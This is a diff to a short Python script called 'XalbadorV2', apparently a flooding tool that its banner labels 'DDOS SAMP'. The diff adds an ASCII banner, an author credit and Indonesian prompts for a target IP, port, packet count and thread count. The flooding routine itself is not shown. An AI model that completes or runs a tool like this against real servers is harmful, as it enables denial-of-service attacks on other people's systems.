@@ -2,11 +2,21 @@
 import random
 import socket
 import threading
+import os
 
+os.system("clear")
+print("Coded By Aryaa")
+print("""\033[1;35mDDOS SAMP 
+██╗░░██╗░█████╗░██╗░░░░░██████╗░░█████╗░██████╗░░█████╗░██████╗░
+╚██╗██╔╝██╔══██╗██║░░░░░██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔══██╗
+░╚███╔╝░███████║██║░░░░░██████╦╝███████║██║░░██║██║░░██║██████╔╝
+░██╔██╗░██╔══██║██║░░░░░██╔══██╗██╔══██║██║░░██║██║░░██║██╔══██╗
+██╔╝╚██╗██║░░██║███████╗██████╦╝██║░░██║██████╔╝╚█████╔╝██║░░██║
+╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝╚═════╝░╚═╝░░╚═╝╚═════╝░░╚════╝░╚═╝░░╚═╝""")
 print("#-- XalbadorV2 --#")
 ip = str(input(" Masukan IP:"))
 port = int(input(" Port:"))
-choice = str(input(" UDP(y/n):"))
+choice = str(input(" Gas Ddos Gak ni?(y/n):"))
 times = int(input(" Mau Berapa Packets?:"))
 threads = int(input(" Isi Packets Threads?:"))
 def run():
